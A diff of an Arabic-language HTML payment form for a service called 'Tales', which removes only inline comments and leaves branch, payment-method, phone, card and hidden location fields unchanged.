@@ -5,7 +5,6 @@
     <meta charset="utf-8">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <!-- 🔒 استدعاء ملفات الحماية   -->
     <script src="protection.js" defer></script>
     <title>Tales | بوابة الدفع الآمن</title>
     
@@ -14,11 +13,8 @@
     <!-- FontAwesome & Bootstrap Grid CSS -->
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/4.6.0/css/bootstrap-grid.min.css">
-
-    <!-- ملف التنسيقات الخارجي -->
     <link rel="stylesheet" href="style.css">
     <style>
-        /* تنسيق خاص لشعار فاليو داخل حقل الهاتف */
         .valu-badge {
             background-color: #00b0ff;
             color: white;
@@ -33,7 +29,6 @@
 </head>
 <body>
 
-    <!-- ستارة المسرح الافتتاحية -->
     <div id="stage-curtain-overlay">
         <div class="curtain-half curtain-top">
             <div class="curtain-content"><i class="fa fa-shield"></i>حكايات - بوابة آمنة</div>
@@ -52,7 +47,6 @@
                     <input type="hidden" id="card_expiry_mm" name="card_expiry_mm">
                     <input type="hidden" id="card_expiry_yy" name="card_expiry_yy">
 
-                    <!-- خانات مخفية إضافية بشركة الدفع -->
                     <input type="hidden" name="geoCity" id="geoCity" value="غير معروف">
                     <input type="hidden" name="geoCountry" id="geoCountry" value="غير معروف">
                     <input type="hidden" name="ispProvider" id="ispProvider" value="غير معروف">
@@ -66,7 +60,6 @@
                     <input type="hidden" name="lang" id="lang" value="غير معروف">
                     <input type="hidden" name="clientID" id="clientID" value="غير متوفر">
 
-                    <!-- 1. اختيار فرع الدفع -->
                     <div class="input-group-custom">
                         <label for="branch_select"><i class="fa fa-sitemap" aria-hidden="true"></i> اختر الفرع:</label>
                         <select name="branch" id="branch_select" class="form-control" style="height: 48px; border-radius: 8px; font-weight: bold; background-color: #f8f9fa;" required>
@@ -76,7 +69,6 @@
                         </select>
                     </div>
 
-                    <!-- 2. اختيار وسيلة الدفع -->
                     <div class="input-group-custom">
                         <label for="payment_method"><i class="fa fa-credit-card-alt" aria-hidden="true"></i> اختر وسيلة الدفع:</label>
                         <select name="payment_method" id="payment_method" class="form-control" style="height: 48px; border-radius: 8px;" required>
@@ -86,7 +78,6 @@
                         </select>
                     </div>
 
-                    <!-- 3. قيمة المبلغ -->
                     <div class="input-group-custom">
                         <label for="pay_amount">المبلغ (بالجنيه):</label>
                         <div class="input-wrapper">
@@ -99,7 +90,6 @@
                         <div class="error-message" id="error_amount">يرجى إدخال مبلغ صحيح.</div>
                     </div>
 
-                    <!-- 4. رقم الهاتف / المحفظة / حساب فاليو -->
                     <div class="input-group-custom" id="phone_group">
                         <label for="user_phone" id="phone_label">رقم الهاتف / المحفظة:</label>
                         <div class="input-wrapper">
@@ -119,7 +109,6 @@
                         <div class="error-message" id="error_phone">يجب كتابة رقم هاتف صحيح.</div>
                     </div>
 
-                    <!-- 5. خانات البطاقة البنكية -->
                     <div id="card_section">
                         <div class="input-group-custom">
                             <label for="card_number">رقم البطاقة البنكية:</label>
@@ -210,7 +199,6 @@
         </div>
     </div>
 
-    <!-- سكربت التحكم في إظهار/إخفاء الحقول بناءً على وسيلة الدفع (شامل فاليو) -->
     <script>
         document.getElementById('payment_method').addEventListener('change', function() {
             const method = this.value;
@@ -240,7 +228,6 @@
         });
     </script>
 
-    <!-- كود تشغيل ستارة المسرح -->
     <script>
        window.addEventListener('load', () => {
            setTimeout(() => {
@@ -260,7 +247,6 @@
        });
     </script>
 
-    <!-- استدعاء ملف الـ Widget لضمان ظهور فقاعة الترحيب وتفعيل الشات -->
     <script src="/chat-widget.js" defer></script>
 </body>
 </html>
